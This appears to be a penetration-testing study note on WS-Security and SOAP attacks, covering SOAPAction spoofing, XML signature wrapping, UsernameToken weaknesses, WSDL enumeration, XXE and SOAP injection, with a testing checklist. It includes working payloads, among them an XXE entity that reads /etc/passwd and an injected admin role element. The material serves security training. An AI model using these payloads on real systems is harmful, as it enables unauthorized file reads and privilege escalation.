2026-02-06

Status:

Tags: [[eWPTX]] [[Web Services]]
###### Prerequisites: [[SOAP]]
# WS-Security & SOAP Attacks

## WS-Security Overview

WS-Security is a SOAP extension for message-level security: authentication, integrity, and confidentiality.

Key components:
- **UsernameToken**: username/password in SOAP header
- **X.509 Certificates**: digital signatures and encryption
- **SAML Tokens**: federated identity assertions
- **Timestamps**: prevent replay attacks

---

## SOAP-Specific Attack Vectors

### 1. SOAPAction Header Spoofing

The `SOAPAction` HTTP header tells the server which operation to invoke. Some implementations trust this header without validating against the SOAP body.

```http
POST /service HTTP/1.1
SOAPAction: "getAdminInfo"
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getUserInfo>   <!-- Body says getUserInfo -->
      <id>1</id>
    </getUserInfo>
  </soapenv:Body>
</soapenv:Envelope>
```

If the server routes based on SOAPAction header instead of parsing the SOAP body, the `getAdminInfo` operation executes.

### 2. XML Signature Wrapping (XSW)

Attacks the XML Digital Signature verification process. The signature validates one part of the XML, but the server processes a different part.

**Concept**:
1. Valid signed message contains `<Operation>getUserInfo</Operation>`
2. Attacker moves the signed element and adds a new unsigned element
3. Signature still validates (it references the original signed node by ID)
4. Server processes the unsigned element: `<Operation>deleteUser</Operation>`

**Variants**: XSW1 through XSW8, each moving elements to different positions in the SOAP envelope.

### 3. UsernameToken Attack

```xml
<wsse:UsernameToken>
  <wsse:Username>admin</wsse:Username>
  <wsse:Password Type="...#PasswordText">password123</wsse:Password>
  <wsse:Nonce>...</wsse:Nonce>
  <wsu:Created>2026-02-06T00:00:00Z</wsu:Created>
</wsse:UsernameToken>
```

Attack vectors:
- **Brute force**: no account lockout on the WS-Security layer
- **Replay**: if nonce/timestamp not validated, replay captured tokens
- **Password type downgrade**: switch from `PasswordDigest` to `PasswordText`

### 4. WSDL Information Disclosure

WSDL files often expose:
- All available operations (including admin/internal ones)
- Parameter names, types, and structures
- Internal naming conventions
- Backend service URLs

```bash
# Fetch WSDL
curl https://target.com/service?wsdl

# Look for hidden operations
grep -i "operation name" service.wsdl
grep -i "admin\|delete\|debug\|internal" service.wsdl
```

### 5. XXE in SOAP

SOAP messages are XML — all XXE techniques apply:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getData>
      <input>&xxe;</input>
    </getData>
  </soapenv:Body>
</soapenv:Envelope>
```

See [[XML External Entities (XXE)]] and [[Blind & OOB XXE]] for techniques.

### 6. SOAP Injection

Inject XML into SOAP parameters to modify the message structure:

```xml
<!-- Normal input: "John" -->
<name>John</name>

<!-- Injected: closes the tag and adds new element -->
<name>John</name><role>admin</role><foo>
```

If input isn't sanitized, the injected XML becomes part of the SOAP message.

---

## Testing Methodology

1. Obtain the WSDL and enumerate all operations
2. Test each operation with valid and malformed input
3. Test SOAPAction header manipulation
4. Test for XXE in SOAP body
5. Check UsernameToken validation (replay, brute force)
6. Test for SOAP injection in input parameters
7. Check if WSDL exposes hidden/admin operations

---

## Tools

- **SoapUI**: SOAP testing and fuzzing
- **Burp Suite**: intercept and modify SOAP requests
- **WS-Attacker**: automated WS-Security attack tool (XSW, SOAPAction spoofing)
